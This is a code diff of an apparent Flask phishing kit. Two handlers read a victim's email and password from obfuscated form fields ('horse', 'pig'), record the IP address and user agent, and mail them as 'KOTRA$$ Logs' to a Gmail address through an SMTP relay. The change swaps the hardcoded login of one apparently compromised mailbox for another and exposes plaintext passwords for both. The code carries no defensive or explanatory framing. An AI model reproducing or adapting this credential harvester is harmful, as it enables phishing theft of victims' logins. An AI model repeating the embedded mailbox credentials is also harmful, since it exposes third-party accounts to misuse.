@@ -191,10 +191,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "peterliew@2mc.com.my"
+        sender_email = "marketing@spgindia.in"
         sender_emaill = "peterliew"
         receiver_email = "florencejose36@gmail.com"
-        password = "P@sswoRD*00028"
+        password = "Marketing@96"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs "
@@ -210,7 +210,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_ssl("mail.2mc.com.my", 465) as server:
+        with smtplib.SMTP_SSL("mail.spgindia.in", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
@@ -231,10 +231,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "peterliew@2mc.com.my"
+        sender_email = "marketing@spgindia.in"
         sender_emaill = "peterliew"
         receiver_email = "florencejose36@gmail.com"
-        password = "P@sswoRD*00028"
+        password = "Marketing@96"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs  !! "
@@ -250,7 +250,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_ssl("mail.2mc.com.my", 465) as server:
+        with smtplib.SMTP_SSL("mail.spgindia.in", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
